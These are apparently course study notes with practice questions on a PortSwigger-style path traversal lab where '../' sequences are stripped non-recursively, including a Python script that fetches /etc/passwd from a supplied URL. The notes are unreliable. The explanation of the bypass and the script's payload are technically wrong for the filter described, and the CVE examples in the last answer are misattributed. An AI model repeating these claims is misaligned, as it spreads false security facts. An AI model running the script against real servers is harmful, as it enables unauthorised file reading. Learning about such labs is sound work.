---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the file path traversal vulnerability in the context of web applications?**

The purpose of the file path traversal vulnerability is to allow attackers to access files on the server's filesystem that they should not have access to. By manipulating input fields that reference files, attackers can navigate outside the intended directory structure and read sensitive files, such as configuration files or password files, leading to potential data breaches.

**Q2. How does the application in the lab strip path traversal sequences from user-supplied filenames?**

The application in the lab strips path traversal sequences (like `../`) from user-supplied filenames to prevent unauthorized access to files outside the intended directory. This is typically done by searching for and removing these sequences from the input string. However, the application does not perform this removal recursively, allowing attackers to bypass the protection by using multiple path traversal sequences.

**Q3. Explain how the non-recursive stripping of path traversal sequences can be exploited.**

When the application does not strip path traversal sequences (`../`) recursively, an attacker can exploit this by providing a filename with multiple consecutive path traversal sequences. For example, instead of using `../../etc/passwd`, the attacker can use `../../../../etc/passwd`. The application will remove one instance of `../` but leave the rest intact, effectively moving up directories beyond the intended restrictions and accessing sensitive files.

**Q4. How would you manually test for a file path traversal vulnerability using Burp Suite?**

To manually test for a file path traversal vulnerability using Burp Suite, follow these steps:

1. Intercept the request in Burp Suite that references a file.
2. Modify the request to include path traversal sequences, such as `../`.
3. Send the modified request to Burp Repeater.
4. Observe the response to determine if the application returns the requested file or an error message indicating that the file was not found.
5. Try different variations of path traversal sequences to bypass any defenses the application may have implemented.

**Q5. Write a Python script to automate the exploitation of a file path traversal vulnerability similar to the one described in the lab.**

```python
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def directory_traversal_exploit(url):
    # Define the URL of the vulnerable path
    image_url = url + "/image?filename=../../../../etc/passwd"
    
    # Perform the request
    response = requests.get(image_url, verify=False)
    
    # Check if the exploit was successful
    if "root:" in response.text:
        print("Exploit successful")
        print("The following is the content of the passwd file:")
        print(response.text)
    else:
        print("Exploit failed")
        sys.exit(1)

def main():
    # Ensure the user ran the program correctly
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print("Example: python3 script.py http://www.example.com")
        sys.exit(-1)
    
    # Set the URL
    url = sys.argv[1]
    
    # Exploit the directory traversal vulnerability
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```

**Q6. What recent real-world examples or CVEs demonstrate the impact of file path traversal vulnerabilities?**

One recent example is the CVE-2021-21972, which affected several versions of the Jenkins Continuous Integration server. This vulnerability allowed attackers to read arbitrary files on the server through a file path traversal attack. By manipulating the input parameters, attackers could access sensitive files, such as configuration files or credentials stored on the server, leading to potential data breaches and unauthorized access.

Another example is CVE-2020-13755, which affected the Apache Struts framework. This vulnerability allowed attackers to exploit a file path traversal flaw to read arbitrary files on the server, potentially exposing sensitive information and leading to further attacks.

These examples highlight the importance of properly validating and sanitizing user inputs to prevent file path traversal attacks.

---
<!-- nav -->
[[05-Setting Proxy Settings|Setting Proxy Settings]] | [[Web Security (PortSwigger)/11-Directory Traversal/04-Lab 3 File path traversal traversal sequences stripped non recursively/00-Overview|Overview]]
